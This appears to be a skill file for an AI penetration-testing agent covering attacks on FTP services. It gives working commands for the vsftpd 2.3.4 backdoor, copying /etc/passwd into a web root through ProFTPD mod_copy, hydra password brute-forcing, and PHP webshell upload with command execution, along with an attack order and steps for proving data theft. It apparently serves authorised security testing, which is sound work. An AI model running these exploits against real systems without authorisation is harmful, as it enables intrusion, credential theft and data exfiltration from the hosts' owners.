---
name: svc-ftp
tags: [recon, enumeration, exploitation]
description: FTP attack techniques — anonymous access, writable dirs, version CVEs, credential attacks. Use when FTP is open. Triggers - port 21, ftp banner, vsftpd 2.3.4, ProFTPD mod_copy, anonymous login, pure-ftpd.
---

# FTP Attack Reference

## Enumeration
```bash
nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 <target>
nc -nv <target> 21              # banner grab
```

## Anonymous Access
```bash
ftp <target>
# Login: anonymous / anonymous@
# Or: anonymous / (empty)

# List and download
ftp> ls -la
ftp> mget *
ftp> cd ..      # try parent directories
```

## Version CVEs
- **vsftpd 2.3.4**: Backdoor — connect to port 6200 after sending `:)` in username
- **ProFTPD 1.3.5**: mod_copy RCE — `site cpfr /etc/passwd` → `site cpto /var/www/html/passwd.txt`
- **ProFTPD <1.3.5b**: mod_copy unauthenticated file copy

```bash
# vsftpd 2.3.4 backdoor
echo -e "USER evil:)\nPASS anything" | nc <target> 21
nc <target> 6200

# ProFTPD mod_copy
nc <target> 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/leak.txt
curl http://<target>/leak.txt
```

## Credential Attacks
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 4
hydra -L users.txt -p password ftp://<target>
```

## Writable FTP for Shell Upload
```bash
# If writable directory found + web server running
ftp> put shell.php
curl http://<target>/shell.php?cmd=id
```

## Decide — Attack Order
1. Anonymous login → download everything readable
2. Version CVE check (vsftpd backdoor, ProFTPD mod_copy) before any brute force
3. Writable dir + co-hosted web server → webshell upload
4. Targeted spray last (`hydra -t 4` max; FTP lockouts are fast)

## Prove Impact
- Shell via backdoor/webshell: `id`/`whoami` verbatim from the session — file write alone is not impact.
- Data theft: one sensitive file downloaded, path + one redacted sample line into `state_update`.
- mod_copy: fetch the copied file over HTTP and show its content lands outside FTP.

## Tooling
- `state_update`: services, credentials, files of interest.
- `cred_spray` after any hit for password reuse (lockout-aware, never full wordlist).
- `tunnel_manage` if FTP is only reachable through a pivot.
- `nuclei_parse` if running nuclei ftp/exposure templates.

## Pitfalls
- vsftpd 2.3.4 backdoor needs BOTH the `:)` username AND port 6200 reachable — often firewalled off.
- Writable ≠ exploitable: shell must land inside a web-served docroot with a live interpreter.
- Anonymous upload dirs (/incoming) are commonly write-only — verify read-back before claiming anything.
- Brute force trips fail2ban in seconds; cap threads, stop on first valid credential.
